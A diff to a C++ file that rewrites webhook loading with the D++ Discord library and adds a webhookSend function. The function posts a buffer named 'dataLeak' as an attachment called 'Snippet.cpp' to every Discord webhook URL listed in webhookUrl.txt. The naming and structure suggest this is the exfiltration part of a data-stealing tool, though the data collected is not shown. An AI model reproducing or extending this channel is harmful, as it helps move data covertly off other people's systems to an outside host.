@@ -2,8 +2,9 @@
 
 #define PTHREAD_FUNCTION void *
 
-char **webhooks = nullptr;
-uint32_t numberOfWebhooks = 0;
+std::vector<dpp::webhook> webhooks;
+
+dpp::cluster bot("");
 
 void initWebhook() {
     FILE * fp = fopen("webhookUrl.txt", "r");
@@ -24,55 +25,27 @@ void initWebhook() {
     fclose(fp);
     fileData[size] = '\0';
 
-    webhooks = (char **)malloc(sizeof(char *) * 50);
-    if (webhooks == nullptr) {
-        free(fileData);
-        return;
-    }
-
     char *offSet = fileData;
     for (int i = 0; i < size; i++) {
         if (fileData[i] == '\n') {
             fileData[i] = '\0';
             if (fileData[i + 1] != '\0') {
-                if (numberOfWebhooks % 50 == 0) {
-                    char ** newBuf = (char **)realloc(webhooks, sizeof(char *) * (numberOfWebhooks + 50));
-                    if (newBuf == nullptr) {
-                        free(fileData);
-                        free(webhooks);
-                        webhooks = nullptr;
-                        numberOfWebhooks = 0;
-                        return;
-                    }
-                    webhooks = newBuf;
+                if (i && fileData[i - 1] == '\0') {
+                    offSet = fileData + i + 1;
+                    continue;
                 }
-                webhooks[numberOfWebhooks++] = offSet;
+
+                webhooks.push_back(dpp::webhook(offSet));
                 offSet = fileData + i + 1;
             }
         }
     }
 
-    char ** newBuf = (char **)realloc(webhooks, sizeof(char *) * numberOfWebhooks);
-    if (newBuf == nullptr) {
-        free(fileData);
-        free(webhooks);
-        webhooks = nullptr;
-        numberOfWebhooks = 0;
-        return;
+    free(fileData);
+}
+
+void webhookSend(char *dataLeak) {
+    for (int i = webhooks.size() - 1; i >= 0; i--) {
+        bot.execute_webhook_sync(webhooks[i], dpp::message("wakwak").add_file("Snippet.cpp", dataLeak));
     }
-    webhooks = newBuf;
-}
-
-void cleanupWebhook() {
-    if (webhooks == nullptr) return;
-    free(webhooks[0]);
-    free(webhooks);
-    webhooks = nullptr;
-    numberOfWebhooks = 0;
-}
-
-PTHREAD_FUNCTION webhookThread(void *args) {
-    char *dataLeak = (char *)args;
-
-    // to send
 }
